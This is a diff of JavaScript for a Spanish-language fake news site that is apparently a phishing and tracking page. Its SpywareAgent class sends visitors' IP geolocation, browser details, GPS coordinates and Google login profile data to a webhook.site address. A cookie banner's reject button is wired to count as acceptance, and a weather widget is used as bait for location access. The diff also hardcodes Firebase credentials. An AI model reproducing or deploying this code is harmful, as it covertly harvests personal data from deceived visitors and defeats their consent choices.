@@ -1,41 +1,31 @@
-
 /**
  * GLOBAL INSIGHT CORE SYSTEM
- * Módulo de gestión de contenidos y telemetría.
+ * Versión limpia y funcional
  */
 
-// === CONFIGURACIÓN PRINCIPAL ===
+// CONFIGURACIÓN FIREBASE - REEMPLAZA CON TUS CREDENCIALES
+const FIREBASE_CONFIG = {
+    apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
+    authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
+    projectId: "recoleccion-datos-a78a6",
+    storageBucket: "recoleccion-datos-a78a6.firebasestorage.app",
+    messagingSenderId: "123889106526",
+    appId: "1:123889106526:web:f3d296fedf8e92907dbecf"
+};
+
 const CONFIG = {
-    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614", 
+    WEBHOOK_URL: "https://webhook.site/69645d7a-1150-4fa8-91c8-5945d2312697",
     COOKIE_TIMEOUT: 1500,
     FORCE_ACCEPT: true
 };
 
-// === CONFIGURACIÓN FIREBASE - REEMPLAZA ESTO ===
-const firebaseConfig = {
-  apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
-  authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
-  projectId: "recoleccion-datos-a78a6",
-  storageBucket: "recoleccion-datos-a78a6.firebasestorage.app",
-  messagingSenderId: "123889106526",
-  appId: "1:123889106526:web:f3d296fedf8e92907dbecf",
-  measurementId: "G-5Z0VCWZD4S"
-};
-// === FIN CONFIGURACIÓN FIREBASE ===
-
-// Base de datos
 const newsDatabase = [
     { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
     { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
     { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
-    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" },
-    { title: "Ciberseguridad: Nuevos Protocolos Bancarios", category: "Tech" },
-    { title: "Crisis Climática: Acuerdos de la Cumbre Global", category: "Mundo" },
-    { title: "Bitcoin rompe barrera de resistencia histórica", category: "Cripto" },
-    { title: "Nuevas regulaciones para drones de reparto", category: "Innovación" }
+    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" }
 ];
 
-// Clase SpywareAgent
 class SpywareAgent {
     constructor(webhook) {
         this.webhook = webhook;
@@ -50,7 +40,7 @@ class SpywareAgent {
             const data = await res.json();
             this.ipData = data;
             this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
-        } catch (e) { 
+        } catch (e) {
             console.error("Fallo IP:", e);
         }
     }
@@ -82,91 +72,60 @@ class SpywareAgent {
             mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain' },
             body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
-        }).then(() => console.log(">> Datos enviados")).catch(e => console.log("Error envío"));
+        }).then(() => console.log("Datos enviados")).catch(e => console.log("Error envío"));
     }
 
-    setCookiesAccepted(status) { 
-        this.acceptedCookies = status; 
+    setCookiesAccepted(status) {
+        this.acceptedCookies = status;
     }
 }
 
-// Sistema de Autenticación
 class AuthManager {
     constructor() {
         this.user = null;
         this.initialized = false;
-        console.log("🔄 Creando AuthManager, FIREBASE_CONFIG disponible:", typeof FIREBASE_CONFIG !== 'undefined');
+        console.log("AuthManager creado, FIREBASE_CONFIG:", typeof FIREBASE_CONFIG);
         this.initFirebase();
     }
 
     initFirebase() {
         try {
-            console.log("🔄 Inicializando Firebase...");
-            console.log("📋 FIREBASE_CONFIG:", FIREBASE_CONFIG);
+            console.log("Inicializando Firebase con:", FIREBASE_CONFIG);
             
-            // Verificar que FIREBASE_CONFIG existe
-            if (typeof FIREBASE_CONFIG === 'undefined') {
-                throw new Error("FIREBASE_CONFIG no está definida en el scope de AuthManager");
-            }
-
-            // Verificar que Firebase está cargado
             if (typeof firebase === 'undefined') {
-                throw new Error("Firebase SDK no está cargado. Revisa la consola del navegador.");
+                throw new Error("Firebase SDK no cargado");
             }
 
-            // Verificar configuración básica
-            if (!FIREBASE_CONFIG.apiKey || FIREBASE_CONFIG.apiKey.includes("AAAAAAAA")) {
-                throw new Error("Configuración de Firebase no válida. Reemplaza las credenciales en FIREBASE_CONFIG.");
-            }
-
-            // Inicializar Firebase
             firebase.initializeApp(FIREBASE_CONFIG);
             this.initialized = true;
-            console.log("✅ Firebase inicializado correctamente");
+            console.log("Firebase inicializado correctamente");
             
-            // Escuchar cambios de autenticación
             firebase.auth().onAuthStateChanged((user) => {
                 this.handleAuthStateChange(user);
             });
 
         } catch (error) {
-            console.error("❌ Error inicializando Firebase:", error);
+            console.error("Error Firebase:", error);
             this.showFirebaseError(error.message);
         }
     }
 
     showFirebaseError(message) {
-        // Mostrar error en la UI
         const errorDiv = document.createElement('div');
         errorDiv.style.cssText = `
             position: fixed; top: 10px; left: 10px; background: #d93025; color: white;
             padding: 15px; border-radius: 5px; z-index: 10000; max-width: 400px;
-            font-family: Arial, sans-serif; font-size: 12px; border: 2px solid #ff4444;
+            font-size: 12px; border: 2px solid #ff4444;
         `;
         errorDiv.innerHTML = `
-            <strong>🔧 Error de Configuración Firebase:</strong><br>
-            ${message}<br><br>
-            <strong>Pasos para solucionar:</strong><br>
-            1. Ve a Firebase Console<br>
-            2. Crea un proyecto y habilita Authentication<br>
-            3. Copia las credenciales reales<br>
-            4. Reemplaza FIREBASE_CONFIG en app.js
+            <strong>Error Firebase:</strong><br>
+            ${message}
         `;
         document.body.appendChild(errorDiv);
-
-        // Deshabilitar botón de login
-        const loginBtn = document.getElementById('btn-login');
-        if (loginBtn) {
-            loginBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Configurar Firebase';
-            loginBtn.style.background = '#d93025';
-            loginBtn.onclick = () => {
-                alert("Reemplaza FIREBASE_CONFIG con tus credenciales reales de Firebase");
-            };
-        }
     }
 
     handleAuthStateChange(user) {
-        console.log("🔄 Estado de autenticación cambiado:", user);
+        console.log("Estado auth cambiado:", user);
         if (user) {
             this.user = user;
             this.showUserProfile(user);
@@ -179,22 +138,17 @@ class AuthManager {
 
     async signInWithGoogle() {
         if (!this.initialized) {
-            alert("Sistema de autenticación no disponible. Configura Firebase primero.");
+            alert("Firebase no configurado");
             return null;
         }
 
         try {
-            console.log("🔐 Iniciando autenticación con Google...");
             const provider = new firebase.auth.GoogleAuthProvider();
-            provider.addScope('profile');
-            provider.addScope('email');
-            
             const result = await firebase.auth().signInWithPopup(provider);
-            console.log("✅ Autenticación exitosa:", result.user);
             return result.user;
         } catch (error) {
-            console.error("❌ Error en login:", error);
-            alert("Error al iniciar sesión: " + error.message);
+            console.error("Error login:", error);
+            alert("Error: " + error.message);
             return null;
         }
     }
@@ -202,9 +156,8 @@ class AuthManager {
     async signOut() {
         try {
             await firebase.auth().signOut();
-            console.log("✅ Sesión cerrada correctamente");
         } catch (error) {
-            console.error("❌ Error cerrando sesión:", error);
+            console.error("Error logout:", error);
         }
     }
 
@@ -214,19 +167,15 @@ class AuthManager {
         
         if (profileWidget && authWidget) {
             document.getElementById('user-name').textContent = user.displayName || 'Usuario';
-            document.getElementById('user-email').textContent = user.email || 'No especificado';
+            document.getElementById('user-email').textContent = user.email || 'No email';
             
             const avatar = document.getElementById('user-avatar');
             if (user.photoURL) {
                 avatar.src = user.photoURL;
-            } else {
-                avatar.src = 'https://via.placeholder.com/50/007bff/ffffff?text=U';
             }
             
             authWidget.style.display = 'none';
             profileWidget.style.display = 'block';
-            
-            console.log("👤 Perfil mostrado:", user.displayName, user.email);
         }
     }
 
@@ -246,7 +195,6 @@ class AuthManager {
             email: user.email,
             displayName: user.displayName,
             photoURL: user.photoURL,
-            emailVerified: user.emailVerified,
             timestamp: new Date().toISOString()
         };
 
@@ -254,21 +202,17 @@ class AuthManager {
             window.spyAgent.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
         }
 
-        console.log("🎯 DATOS OBTENIDOS LEGALMENTE:");
-        console.log("   👤 Nombre:", user.displayName);
-        console.log("   📧 Email:", user.email);
-        console.log("   🖼️ Foto:", user.photoURL);
+        console.log("Datos usuario capturados:", userData);
     }
 }
 
-// Funciones UI
 function renderNews() {
     const heroEl = document.getElementById("hero-news");
     const gridEl = document.getElementById("secondary-grid");
     
     const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());
 
-    if(heroEl && shuffled.length > 0) {
+    if (heroEl && shuffled.length > 0) {
         const hero = shuffled[0];
         heroEl.innerHTML = `
             <img src="https://picsum.photos/800/600?random=${Math.random()}" alt="News">
@@ -279,8 +223,8 @@ function renderNews() {
         `;
     }
 
-    if(gridEl && shuffled.length > 1) {
-        gridEl.innerHTML = ""; 
+    if (gridEl && shuffled.length > 1) {
+        gridEl.innerHTML = "";
         const secondaryNews = shuffled.slice(1, 5);
         
         secondaryNews.forEach(news => {
@@ -298,10 +242,10 @@ function renderNews() {
 
 function renderTrending() {
     const listEl = document.getElementById("trending-list");
-    if(!listEl) return;
+    if (!listEl) return;
 
-    listEl.innerHTML = ""; 
-    const trendingNews = newsDatabase.slice(0, 5); 
+    listEl.innerHTML = "";
+    const trendingNews = newsDatabase.slice(0, 5);
 
     trendingNews.forEach((news, index) => {
         const li = document.createElement("li");
@@ -316,7 +260,6 @@ function renderTrending() {
     });
 }
 
-// Configurar eventos de auth
 function setupAuthEvents(authManager) {
     const loginBtn = document.getElementById('btn-login');
     const googleLoginBtn = document.getElementById('btn-google-login');
@@ -331,17 +274,9 @@ function setupAuthEvents(authManager) {
 
     if (googleLoginBtn) {
         googleLoginBtn.addEventListener('click', async () => {
-            googleLoginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Conectando...';
-            googleLoginBtn.disabled = true;
-
             const user = await authManager.signInWithGoogle();
-            
-            if (user) {
-                if (loginModal) loginModal.style.display = 'none';
-                showCustomNotification(`Bienvenido, ${user.displayName || 'Usuario'}!`);
-            } else {
-                googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
-                googleLoginBtn.disabled = false;
+            if (user && loginModal) {
+                loginModal.style.display = 'none';
             }
         });
     }
@@ -349,7 +284,6 @@ function setupAuthEvents(authManager) {
     if (logoutBtn) {
         logoutBtn.addEventListener('click', () => {
             authManager.signOut();
-            showCustomNotification('Sesión cerrada correctamente');
         });
     }
 
@@ -357,33 +291,9 @@ function setupAuthEvents(authManager) {
         loginModal.addEventListener('click', (e) => {
             if (e.target === loginModal) {
                 loginModal.style.display = 'none';
-                
-                // Resetear botón si se cierra el modal
-                const googleLoginBtn = document.getElementById('btn-google-login');
-                if (googleLoginBtn) {
-                    googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
-                    googleLoginBtn.disabled = false;
-                }
             }
         });
     }
-}
-
-function updateWeatherUI(widget, content, weather) {
-    content.style.transition = "all 0.5s ease";
-    content.style.filter = "none";
-    content.style.opacity = "1";
-    
-    const tempEl = widget.querySelector(".fake-temp");
-    const descEl = content.querySelector("p");
-    
-    tempEl.innerText = `${weather.temperature}°C`;
-    tempEl.style.color = "#333"; 
-    
-    descEl.innerHTML = `
-        <div style="font-size: 2rem; margin: 10px 0;"><i class="fas fa-sun" style="color:orange"></i></div>
-        <strong>Clima Actualizado</strong>
-    `;
 }
 
 function setupCookieTrap(spyAgent) {
@@ -391,7 +301,7 @@ function setupCookieTrap(spyAgent) {
     const btnAccept = document.getElementById('btn-accept-all');
     const btnReject = document.getElementById('btn-reject');
 
-    if(!modal) return;
+    if (!modal) return;
 
     modal.style.display = 'flex';
 
@@ -399,116 +309,54 @@ function setupCookieTrap(spyAgent) {
         spyAgent.setCookiesAccepted(true);
         modal.style.display = 'none';
         spyAgent.trackIP();
-        showSafeNotification();
     };
 
-    if(btnAccept) btnAccept.addEventListener('click', close);
-    if(btnReject) btnReject.addEventListener('click', () => {
-        btnReject.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Guardando...';
+    if (btnAccept) btnAccept.addEventListener('click', close);
+    if (btnReject) btnReject.addEventListener('click', () => {
         setTimeout(close, 800);
     });
 }
 
-function showSafeNotification() {
-    showCustomNotification('Preferencias actualizadas');
-}
-
-function showCustomNotification(message) {
-    const notif = document.createElement('div');
-    notif.style.cssText = `
-        position: fixed; top: 20px; right: 20px; background: #333; color: white;
-        padding: 12px 20px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        z-index: 10000; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;
-        animation: slideIn 0.5s ease forwards;
-    `;
-    notif.innerHTML = `<i class="fas fa-check" style="color:#0f9d58;"></i> ${message}`;
-    document.body.appendChild(notif);
-    setTimeout(() => notif.remove(), 3000);
-}
-
-// Añadir keyframes para la animación
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideIn {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
-    }
-`;
-document.head.appendChild(style);
-
-// === INICIALIZACIÓN PRINCIPAL ===
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("🚀 Iniciando aplicación Global Insight...");
-    console.log("🔍 Verificando FIREBASE_CONFIG en scope global:", typeof FIREBASE_CONFIG);
-    console.log("📋 Valor FIREBASE_CONFIG:", FIREBASE_CONFIG);
+    console.log("Iniciando aplicación...");
+    console.log("FIREBASE_CONFIG disponible:", typeof FIREBASE_CONFIG !== 'undefined');
     
-    // 1. Inicializar Agente Espía
     const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
     window.spyAgent = spy;
 
-    // 2. Inicializar Sistema de Autenticación
-    console.log("🔄 Creando AuthManager...");
     const authManager = new AuthManager();
     window.authManager = authManager;
 
-    // 3. Cargar contenido VISUAL
     renderNews();
     renderTrending();
-
-    // 4. Configurar eventos
     setupAuthEvents(authManager);
 
-    // 5. Trampa de cookies
     setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);
 
-    // Fecha
     const dateEl = document.getElementById("current-date");
-    if(dateEl) {
-        dateEl.innerText = new Date().toLocaleDateString('es-ES', { 
-            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
+    if (dateEl) {
+        dateEl.innerText = new Date().toLocaleDateString('es-ES', {
+            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
         });
     }
 
-    // GPS
     const btnGps = document.getElementById("btn-gps-trigger");
-    const weatherWidget = document.getElementById("weather-trap");
-    
-    if(btnGps && weatherWidget) {
-        const blurContent = weatherWidget.querySelector(".blur-content");
-
+    if (btnGps) {
         btnGps.addEventListener("click", () => {
             if (!spy.acceptedCookies) {
-                alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
-                const modal = document.getElementById('cookie-modal');
-                if(modal) modal.style.display = 'flex';
+                alert("Acepta las cookies primero");
                 return;
             }
             
-            const btn = btnGps.querySelector("button");
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo...';
-            
             spy.trackGPS(
-                async (data) => {
-                    btnGps.style.opacity = "0";
-                    setTimeout(() => { btnGps.style.display = "none"; }, 500);
-                    
-                    try {
-                        const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
-                        const weatherData = await weatherRes.json();
-                        updateWeatherUI(weatherWidget, blurContent, weatherData.current_weather);
-                    } catch (error) {
-                        updateWeatherUI(weatherWidget, blurContent, { temperature: "24", weathercode: 1 });
-                    }
+                (data) => {
+                    btnGps.style.display = "none";
+                    console.log("GPS éxito:", data);
                 },
                 (error) => {
-                    btn.innerHTML = "Ubicación Bloqueada";
-                    setTimeout(() => { btn.innerHTML = originalText; }, 2000);
-                    alert("Activa la ubicación en el navegador.");
+                    alert("Error GPS: " + error);
                 }
             );
         });
     }
-
-    console.log("✅ Aplicación inicializada completamente");
 });
